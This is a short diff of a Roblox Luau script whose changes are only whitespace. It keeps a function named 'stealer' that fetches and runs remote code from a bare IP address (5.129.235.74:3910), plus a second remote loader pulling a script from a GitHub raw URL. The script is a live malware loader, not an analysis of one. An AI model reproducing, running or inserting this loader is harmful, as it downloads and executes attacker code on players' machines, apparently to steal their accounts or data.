@@ -1,9 +1,10 @@
 ID="33a3a8b1-92d2-48f9-93e8-91b051e841c8";
 local function stealer()
-    loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
 end
 local function loadui()
-    loadstring(game:HttpGet(“https://raw.githubusercontent.com/Kiane204/loading-screen/refs/heads/main/Loading”))()
+
+loadstring(game:HttpGet(“https://raw.githubusercontent.com/Kiane204/loading-screen/refs/heads/main/Loading”))()
 
 end
 
